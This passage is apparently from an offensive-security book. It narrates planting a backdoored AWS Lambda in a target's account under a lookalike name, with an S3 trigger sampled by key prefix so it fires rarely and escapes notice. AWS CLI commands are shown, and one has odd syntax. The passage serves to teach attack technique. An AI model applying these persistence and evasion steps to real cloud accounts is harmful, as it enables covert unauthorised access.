As always, we try hiding in plain sight by sticking to existing naming conventions. We look up existing Lambda functions in the eu-west-1 region for inspiration:

```
root@Point1:~/# aws iam lambda list-functions -region=eu-west-1
"FunctionName": "support-bbs-news",
"FunctionName": "support-parse-logs",
"FunctionName": "ssp-streaming-format",
--snip--
```

We’ll settle on the name support-metrics-calc and call the create-function API to register our backdoored Lambda:

```
root@Point1:~/# aws lambda create-function --function-name support-metrics-calc \
--zip-file fileb://function.zip \
--handler function \
--runtime go1.x \
--role arn:aws:iam::886371554408:role/dynamo-ssh-mgmt \
--region eu-west-1
```

Now to the trigger event itself.

# Setting Up the Trigger Event

Ideally, we want to target an S3 bucket that’s regularly updated by MXR Ads, but not so often that it would trigger our Lambda 1,000 times a day.

> NOTE
We chose to create the Lambda in the same region used by MXR Ads, but we could have just as well smuggled it into an unused region. This Lambda will cost practically nothing, so it will hardly be noticeable, even on the billing report.

How about s4d.mxrads.com, the bucket storing all creatives that we looked at in Chapter 8? A quick list-objects-v2 API call shows that the update pace is relatively low, between 50 and 100 files a day:

```
root@Point1:~/# aws s3api list-objects-v2 --bucket s4d.mxrads.com > list_keys.txt
"Key": "2aed773247f0211803d5e67b/82436/vid/720/6aa58ec9f77aca497f90c71c85ee.mp4",
"LastModified": "2019-12-14T11:01:48.000Z",
--snip--

root@Point1:~/# grep -c "2020-12-14" list_keys.txt
89
root@Point1:~/# grep -c "2020-12-13" list_keys.txt
74
--snip--
```

We can reduce the trigger rate by sampling the objects firing the notification event. We’ll make it so only objects with a key name beginning with "2" will trigger our Lambda, giving us a 1/16 sample rate (assuming a hexadecimal key space, evenly distributed). This roughly translates to three to six invocations a day.
Sold.